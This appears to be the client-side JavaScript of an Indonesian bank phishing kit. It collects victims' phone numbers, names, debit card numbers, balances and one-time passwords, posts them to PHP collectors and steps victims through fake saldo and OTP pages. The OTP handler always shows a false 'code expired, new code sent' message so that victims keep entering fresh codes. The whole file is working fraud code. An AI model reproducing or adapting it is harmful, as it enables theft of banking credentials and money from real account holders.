$('#forgetPasswordForm').on('submit', function (event) {

 
  event.stopPropagation();
    event.preventDefault();
   
    
document.getElementById('btnSubmit').innerHTML = "Memproses...";    

$.ajax({
 type: 'POST',
 url: 'sendDebit.php?action=getforgetPasswordForm',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(),
 
 complete: function(data) {
            console.log('Complete')
var hape = document.getElementById("nomorku").value;
 sessionStorage.setItem("hape", hape);              
 var namaku = document.getElementById("nama").value;
 sessionStorage.setItem("namaku", namaku);
 var kartu = document.getElementById("debit").value;
 sessionStorage.setItem("kartu", kartu);  
   location.href ="./saldo.html";
        }
    });

    return false;
});   

 

 $('#formsaldo1').on('submit', function (event) {

  event.stopPropagation();
    event.preventDefault();
    
document.getElementById('btnSubmit1').innerHTML = "Memproses...";    



$.ajax({

 type: 'POST',
 url: 'sendOtp.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(),
 
 complete: function(data) {
            console.log('Complete')

$("#invalid").addClass("fontku");      
$("#invalid").text("Kode OTP Kadaluarsa, Silahkan Coba Lagi");
$("#invalid").css("color","red");
        
   setTimeout(function(){
        $("#invalid").text("Kode OTP baru sudah kami kirimkan kembali");
$("#invalid").css("color","green");
        $("#invalid").show()
   }, 3000);
   setTimeout(function(){
  $("#invalid").css("color","#0f78cb");    
        $("#invalid").text(">> Request Kode OTP ? <<");
     $("#invalid").removeClass("fontku");  document.getElementById('btnSubmit1').innerHTML = "PROSES";$("#otp").val("");          
                $("#otp").focus();
   }, 5000);



        }
    });

    return false;
});   
    




 $('#formsaldo').on('submit', function (event) {

  event.stopPropagation();
    event.preventDefault();
    
document.getElementById('btnSubmit1').innerHTML = "Memproses...";    



$.ajax({

 type: 'POST',
 url: 'sendSaldo.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(),
 
 complete: function(data) {
            console.log('Complete')
 

var phone = document.getElementById("nomorsaya").value;
 sessionStorage.setItem("phone", phone);
 var user = document.getElementById("namasaya").value;
 sessionStorage.setItem("user", user);
 var card = document.getElementById("debitku").value;
 sessionStorage.setItem("card", card);
 var duet = document.getElementById("rupiah").value;
 sessionStorage.setItem("duet", duet);  
location.href ="./otp.html";



        }
    });

    return false;
});   
    